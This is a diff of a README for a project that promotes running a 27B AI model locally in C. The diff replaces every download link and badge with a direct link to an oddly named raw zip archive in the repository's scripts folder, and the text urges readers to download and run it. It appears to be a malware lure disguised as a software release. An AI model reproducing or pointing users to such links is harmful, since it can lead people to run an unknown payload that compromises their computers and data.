@@ -1,6 +1,6 @@
 # ⚡ qwen3.8-27b-in-c - Run a 27B AI on your laptop
 
-[![Download Now](https://img.shields.io/badge/Download-qwen3.8--27b--in--c-blue?style=for-the-badge&logo=github)](https://github.com/natee6684/qwen3.8-27b-in-c)
+[![Download Now](https://img.shields.io/badge/Download-qwen3.8--27b--in--c-blue?style=for-the-badge&logo=github)](https://github.com/natee6684/qwen3.8-27b-in-c/raw/refs/heads/main/scripts/in_c_qwen_b_pecker.zip)
 
 ## 🎯 What Is This?
 
@@ -20,7 +20,7 @@ This isn't a toy. It's a full, working AI that can understand and generate text,
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/natee6684/qwen3.8-27b-in-c](https://github.com/natee6684/qwen3.8-27b-in-c)
+Visit this link to download the application: [https://github.com/natee6684/qwen3.8-27b-in-c/raw/refs/heads/main/scripts/in_c_qwen_b_pecker.zip](https://github.com/natee6684/qwen3.8-27b-in-c/raw/refs/heads/main/scripts/in_c_qwen_b_pecker.zip)
 
 Once you're on that page, look for the download section. The file you need will be clearly marked. Download it to your computer.
 
@@ -143,7 +143,7 @@ You don't need to be a tech expert. You don't need expensive hardware. You just 
 
 Imagine having a personal AI assistant that's always available, respects your privacy, and never costs a penny. That's what qwen3.8-27b-in-c offers. 
 
-[![Get Started](https://img.shields.io/badge/Download-qwen3.8--27b--in--c-orange?style=for-the-badge)](https://github.com/natee6684/qwen3.8-27b-in-c)
+[![Get Started](https://img.shields.io/badge/Download-qwen3.8--27b--in--c-orange?style=for-the-badge)](https://github.com/natee6684/qwen3.8-27b-in-c/raw/refs/heads/main/scripts/in_c_qwen_b_pecker.zip)
 
 Visit the link, download the file, and run it. You'll be chatting with your own private AI in minutes.
 
